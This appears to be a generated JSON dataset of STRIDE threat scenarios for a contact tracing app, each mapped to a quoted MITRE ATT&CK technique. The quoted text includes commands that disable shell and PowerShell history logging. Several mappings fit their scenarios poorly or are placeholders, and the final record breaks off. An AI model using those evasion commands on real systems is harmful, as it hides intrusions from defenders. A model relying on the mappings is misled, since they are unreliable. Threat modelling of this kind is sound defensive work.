[
{
    "case_number": "10",
    "batch_number": "2",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a malicious app that mimics the legitimate contact tracing app to steal user's Bluetooth or GPS data.",
            "Assumptions": [
                {
                    "Assumption": "Users may download apps from unofficial sources.",
                    "Role": "User",
                    "Condition": "Users lack knowledge and caution downloading apps."
                },
                {
                    "Assumption": "Attackers can create apps with similar appearance.",
                    "Role": "Attacker",
                    "Condition": "Attackers have access to design and development skills."
                },
                {
                    "Assumption": "System does not flag unauthorized apps.",
                    "Role": "System",
                    "Condition": "Absence of software verification measures."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive location and health data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "phishing",
                "bluetooth",
                "gps",
                "malicious app"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious user impersonates another user to provide false positive COVID-19 results to the centralized server.",
            "Assumptions": [
                {
                    "Assumption": "User authentication is weak or absent.",
                    "Role": "System",
                    "Condition": "Weak or no user authentication measures are in place."
                },
                {
                    "Assumption": "Server relies on self-reported information.",
                    "Role": "System",
                    "Condition": "Server trusts user-reported test statuses."
                },
                {
                    "Assumption": "Attackers have access to victim's basic information.",
                    "Role": "Attacker",
                    "Condition": "Attackers can gain access to user data (e.g., phishing)."
                }
            ],
            "Potential Impact": "Corruption of health data and potential privacy violations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity theft",
                "false data",
                "centralized server"
            ],
            "mitre_technique": {
                "name": "Phishing",
                "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
                "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
                "technique_id": "T1566"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised device to broadcast fake proximity data to nearby devices, causing false exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "Device can be compromised remotely.",
                    "Role": "Attacker",
                    "Condition": "Device lacks sufficient security measures."
                },
                {
                    "Assumption": "Proximity data is exchanged without proper validation.",
                    "Role": "System",
                    "Condition": "System does not validate or sanitize proximity data effectively."
                },
                {
                    "Assumption": "Users are not warned about unusual device behavior.",
                    "Role": "System",
                    "Condition": "No anomaly detection mechanisms are in place."
                }
            ],
            "Potential Impact": "Disruption of user confidence and system reliability.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "malicious broadcast",
                "proximity data",
                "false notifications"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters communication between user devices and the central server in a centralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "Communication is not encrypted.",
                    "Role": "System",
                    "Condition": "Absence of strong encryption mechanisms."
                },
                {
                    "Assumption": "Attacker can perform MITM attacks.",
                    "Role": "Attacker",
                    "Condition": "Attacker has network access capabilities."
                },
                {
                    "Assumption": "Lack of data integrity checks.",
                    "Role": "System",
                    "Condition": "System does not verify data integrity."
                }
            ],
            "Potential Impact": "Unauthorized data modification and potential security breaches.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "interception",
                "MITM",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A compromised user device alters locally stored rolling keys before uploading them to the server in a decentralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "Device security is compromised.",
                    "Role": "User Device",
                    "Condition": "Device lacks robust security practices."
                },
                {
                    "Assumption": "Rolling keys are stored unencrypted.",
                    "Role": "System",
                    "Condition": "Keys are stored without encryption."
                },
                {
                    "Assumption": "No verification of keys before upload.",
                    "Role": "System",
                    "Condition": "System does not verify keys before accepting them."
                }
            ],
            "Potential Impact": "Corruption of exposure data and misleading notifications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "key alteration",
                "compromised device",
                "decentralized"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
                "id": "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df",
                "technique_id": "T1054"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits vulnerabilities in the central server to modify or delete critical system logs.",
            "Assumptions": [
                {
                    "Assumption": "Server has unpatched vulnerabilities.",
                    "Role": "Central Server",
                    "Condition": "Server is running outdated or vulnerable software."
                },
                {
                    "Assumption": "Insufficient log protection.",
                    "Role": "System",
                    "Condition": "Logs are inadequately protected against tampering."
                },
                {
                    "Assumption": "No regular log integrity checks.",
                    "Role": "System",
                    "Condition": "System lacks periodic log integrity validation."
                }
            ],
            "Potential Impact": "Loss of audit trails and system accountability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "log manipulation",
                "server exploitation",
                "data deletion"
            ],
            "mitre_technique": {
                "name": "Clear Network Connection History and Configurations",
                "description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
                "id": "attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc",
                "technique_id": "T1070.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having submitted a positive COVID-19 test result which was falsely reported to the system.",
            "Assumptions": [
                {
                    "Assumption": "No non-repudiation measures.",
                    "Role": "System",
                    "Condition": "System does not implement non-repudiation controls."
                },
                {
                    "Assumption": "System accepts unverified test results.",
                    "Role": "System",
                    "Condition": "System does not verify the authenticity of test results."
                },
                {
                    "Assumption": "Users can report results anonymously.",
                    "Role": "User",
                    "Condition": "Users are allowed to submit results without user verification."
                }
            ],
            "Potential Impact": "Disputes over data integrity and reporting accuracy.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "false reporting",
                "non-repudiation",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A healthcare worker disputes an entry in the system's logs regarding their interaction logging activities.",
            "Assumptions": [
                {
                    "Assumption": "Log entries lack sufficient detail.",
                    "Role": "System",
                    "Condition": "Logs do not capture enough detail to accurately attribute actions."
                },
                {
                    "Assumption": "Logs can be altered or deleted.",
                    "Role": "System",
                    "Condition": "System allows modification of log entries."
                },
                {
                    "Assumption": "No audit trails.",
                    "Role": "System",
                    "Condition": "System does not maintain proper audit logs."
                }
            ],
            "Potential Impact": "Loss of trust and potential legal issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log dispute",
                "audit trails",
                "log integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user attempts to deny involvement in a data tampering incident by exploiting the lack of proper user activity logging.",
            "Assumptions": [
                {
                    "Assumption": "Lack of user activity monitoring.",
                    "Role": "System",
                    "Condition": "System does not adequately monitor user activities."
                },
                {
                    "Assumption": "Activity logs can be manipulated.",
                    "Role": "System",
                    "Condition": "Log entries can be altered post-incident."
                },
                {
                    "Assumption": "No multifactor authentication.",
                    "Role": "User",
                    "Condition": "System relies on single-factor auth mechanisms."
                }
            ],
            "Potential Impact": "Difficulty in incident investigation and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "activity monitoring",
                "user logs",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthorized user gains access to raw proximity data stored on user devices.",
            "Assumptions": [
                {
                    "Assumption": "Data is not encrypted on devices.",
                    "Role": "System",
                    "Condition": "Locally stored data is plaintext."
                },
                {
                    "Assumption": "Device lacks proper access controls.",
                    "Role": "User Device",
                    "Condition": "Device does not enforce strong access permissions."
                },
                {
                    "Assumption": "Attacker can physically or remotely access device.",
                    "Role": "Attacker",
                    "Condition": "Attacker gains physical or remote access to the device."
                }
            ],
            "Potential Impact": "Unauthorized data disclosure and privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data access",
                "device security",
                "proximity data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive health information is intercepted during transmission between user devices and the central server in centralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "System",
                    "Condition": "Communication channels lack encryption."
                },
                {
                    "Assumption": "Network can be monitored by attackers.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to network traffic."
                },
                {
                    "Assumption": "No integrity checks on transmitted data.",
                    "Role": "System",
                    "Condition": "System does not validate data integrity."
                }
            ],
            "Potential Impact": "Disclosure of sensitive health and location data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "unencrypted transmission",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A lack of proper access controls on the centralized server allows unauthorized personnel to access sensitive contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "Server access controls are insufficient.",
                    "Role": "Central Server",
                    "Condition": "Weak or misconfigured access controls."
                },
                {
                    "Assumption": "Insider threats not considered.",
                    "Role": "System",
                    "Condition": "System lacks protections against insider threats."
                },
                {
                    "Assumption": "Sensitive data stored without proper segregation.",
                    "Role": "System",
                    "Condition": "Data is not compartmentalized."
                }
            ],
            "Potential Impact": "Unauthorized access to and potential misuse of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "server access",
                "insider threat",
                "contact tracing data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a Distributed Denial of Service (DDoS) attack on the central server, overwhelming it with traffic and disrupting service.",
            "Assumptions": [
                {
                    "Assumption": "Server can be overwhelmed by traffic.",
                    "Role": "Central Server",
                    "Condition": "Server is configured to handle limited traffic."
                },
                {
                    "Assumption": "Absence of DDoS protection.",
                    "Role": "System",
                    "Condition": "No DDoS protection mechanisms are in place."
                },
                {
                    "Assumption": "Attacker has botnet or similar resources.",
                    "Role": "Attacker",
                    "Condition": "Attacker controls a large number of compromised devices."
                }
            ],
            "Potential Impact": "System downtime and loss of service availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "server overload",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the mobile application to cause it to crash or become unresponsive on user devices.",
            "Assumptions": [
                {
                    "Assumption": "Application contains unpatched vulnerabilities.",
                    "Role": "Mobile Application",
                    "Condition": "App is running outdated or vulnerable code."
                },
                {
                    "Assumption": "No input validation.",
                    "Role": "System",
                    "Condition": "Application lacks proper input validation."
                },
                {
                    "Assumption": "Users lack immediate remedy options.",
                    "Role": "User",
                    "Condition": "Users cannot easily recover from app crashes."
                }
            ],
            "Potential Impact": "Application crashes leading to loss of data access.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "app vulnerability",
                "exploit",
                "application crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider or malicious user repeatedly uploads manipulated rolling keys, causing the system to waste resources processing invalid data.",
            "Assumptions": [
                {
                    "Assumption": "No validation mechanism for uploaded keys.",
                    "Role": "System",
                    "Condition": "Keys are accepted without verification."
                },
                {
                    "Assumption": "System resources are limited.",
                    "Role": "System",
                    "Condition": "System can't efficiently handle high volumes of invalid data."
                },
                {
                    "Assumption": "Lack of rate-limiting mechanisms.",
                    "Role": "System",
                    "Condition": "No controls to limit the rate of submissions."
                }
            ],
            "Potential Impact": "Resource exhaustion and service degradation.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "data manipulation",
                "invalid data"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the mobile application to gain higher privileges on a user\u2019s device.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities exist in the app.",
                    "Role": "Mobile Application",
                    "Condition": "App contains exploitable code flaws."
                },
                {
                    "Assumption": "User's device has insufficient protection.",
                    "Role": "User Device",
                    "Condition": "Device lacks robust security measures."
                },
                {
                    "Assumption": "Attacker can remotely access the device.",
                    "Role": "Attacker",
                    "Condition": "Attacker has network access to the device."
                }
            ],
            "Potential Impact": "Compromise of device security and unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "app vulnerability",
                "remote access",
                "device security"
            ],
            "mitre_technique": {
                "name": "Automated Collection",
                "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.",
                "id": "attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619",
                "technique_id": "T1119"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised server component allows an attacker to execute commands with higher privileges than intended.",
            "Assumptions": [
                {
                    "Assumption": "Server vulnerabilities are unpatched.",
                    "Role": "Central Server",
                    "Condition": "Server runs outdated software."
                },
                {
                    "Assumption": "Insufficient access control mechanisms.",
                    "Role": "System",
                    "Condition": "Access control is not properly configured."
                },
                {
                    "Assumption": "Attacker has initial access to server.",
                    "Role": "Attacker",
                    "Condition": "Attacker has some level of access to the server."
                }
            ],
            "Potential Impact": "Server compromise and potential system-wide access.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "server vulnerability",
                "command execution",
                "access control"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a software flaw to escalate privileges from a regular user role to an administrator role on the centralized system.",
            "Assumptions": [
                {
                    "Assumption": "Flaw exists in user role management.",
                    "Role": "Central Server",
                    "Condition": "Role management code is vulnerable."
                },
                {
                    "Assumption": "Lack of privilege separation.",
                    "Role": "System",
                    "Condition": "System does not enforce strict role separation."
                },
                {
                    "Assumption": "Attacker has user-level access.",
                    "Role": "Attacker",
                    "Condition": "Attacker has compromised a user account."
                }
            ],
            "Potential Impact": "Unauthorized control over sensitive system operations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "role escalation",
                "user management flaw",
                "administrator access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "3",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could create a fake contact tracing app to lure users into downloading it, capturing their sensitive data like health status and contact information.",
            "Assumptions": [
                {
                    "Assumption": "Users can be tricked into downloading apps from unofficial sources.",
                    "Role": "User",
                    "Condition": "The app bypasses detection by app stores' security checks."
                },
                {
                    "Assumption": "Attackers possess the necessary technical skills to clone the legitimate app interface.",
                    "Role": "Attacker",
                    "Condition": "The genuine app is not heavily obfuscated."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "mobile",
                "phishing",
                "user data"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
